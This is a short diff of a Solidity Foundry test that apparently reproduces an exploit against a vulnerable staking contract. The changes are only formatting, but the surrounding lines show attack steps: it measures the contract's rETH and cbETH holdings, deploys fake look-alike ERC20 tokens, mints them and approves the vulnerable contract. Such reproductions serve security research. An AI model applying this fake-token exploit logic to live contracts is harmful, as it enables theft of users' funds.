@@ -106,12 +106,12 @@ contract ASTTest is Test {
         stakedTokens[1] = address(rETH);
         stakedTokens[2] = address(cbETH);
         deal(address(this), 0);
-        uint256[] memory balances = new uint[](3);
+        uint256[] memory balances = new uint256[](3);
         emit log_named_decimal_uint("Attacker Eth balance before attack:", address(this).balance, 18);
         for (uint8 i = 0; i < stakedTokens.length; i++) {
             uint256 staked_bal = IERC20(stakedTokens[i]).balanceOf(address(vulnerable));
             balances[i] = staked_bal;
-            MyERC20 fake_token = new MyERC20(stakedTokens[i],staked_bal);
+            MyERC20 fake_token = new MyERC20(stakedTokens[i], staked_bal);
             fake_token.mint(10_000 * 1e18);
             fake_token.approve(address(vulnerable), type(uint256).max);
 
